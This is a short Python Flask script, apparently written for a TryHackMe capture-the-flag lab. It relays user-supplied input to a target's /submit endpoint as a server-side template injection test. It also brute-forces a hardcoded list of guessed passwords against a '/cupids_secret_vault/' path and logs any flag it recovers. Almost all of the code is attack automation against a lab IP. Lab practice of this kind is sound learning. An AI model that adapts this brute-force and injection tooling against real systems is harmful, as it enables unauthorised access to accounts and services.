import requests
from flask import Flask, request, render_template_string, redirect, url_for

app = Flask(__name__)

# TARGET CONFIGURATION
TARGET_IP = "10.49.138.170:5000"
REMOTE_URL = f"http://{TARGET_IP}/cupids_secret_vault/"

# List of credentials/paths to brute-force
POTENTIAL_SECRETS = [
    "cupid_arrow_2026!!!", 
    "cupid_arrow_2026", 
    "admin", 
    "password",
    "20260214"
]

leaked_letters = ["SYSTEM: Automation Bridge Active..."]

# ... (Keep your HTML_TEMPLATE from the previous step) ...

@app.route('/submit', methods=['POST'])
def submit():
    user_msg = request.form.get('message')
    
    # 1. Manual Payload Forwarding (SSTI Test)
    if user_msg:
        try:
            r = requests.post(f"http://{TARGET_IP}/submit", data={'message': user_msg}, timeout=3)
            leaked_letters.append(f"SENT TO VAULT: {user_msg}")
        except: pass

    # 2. AUTOMATION: Brute-force credentials against the /cupids_secret_vault/
    leaked_letters.append("--- STARTING BRUTE FORCE ---")
    for secret in POTENTIAL_SECRETS:
        try:
            # Try as a password field
            resp = requests.post(REMOTE_URL, data={'password': secret}, timeout=2)
            if "flag" in resp.text.lower() or resp.status_code == 200:
                leaked_letters.append(f"SUCCESS WITH: {secret}")
                # If we find the flag, stop and show it!
                if "THM{" in resp.text:
                    leaked_letters.append(f"FOUND FLAG: {resp.text}")
            else:
                leaked_letters.append(f"FAILED: {secret} (Status {resp.status_code})")
        except:
            leaked_letters.append(f"ERROR: Could not reach {TARGET_IP}")

    return redirect(url_for('gallery'))

if __name__ == '__main__':
    # Run on 5001 so you don't clash with the target or your other server
    app.run(port=5001, debug=True)

